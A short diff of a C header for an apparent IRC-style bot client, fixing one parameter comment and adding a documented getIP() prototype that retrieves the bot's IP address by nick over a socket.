@@ -113,7 +113,7 @@ int readserver(char *s, int sckt);
 
 /* send command to server
  * parameter s: command
- * parameter sckt: connected server
+ * parameter sckt: connected socket
  * returns: 0 if successful, -1 else
  */
 int writeserver(char *s, int sckt);
@@ -123,6 +123,14 @@ int writeserver(char *s, int sckt);
  * returns: 0 if successful, -1 else
  */
 int osinfo(char *info);
+
+/* get IP of the bot
+ * parameter ip: string where the ip will be saved
+ * parameter nick: nick of bot
+ * parameter sckt: connected socket
+ * returns: 0 if successful, -1 else
+ */
+int getIP(char *ip, char *nick, int sckt);
 
 /* find s2 in s1
  * parameter s1: string to be searched in
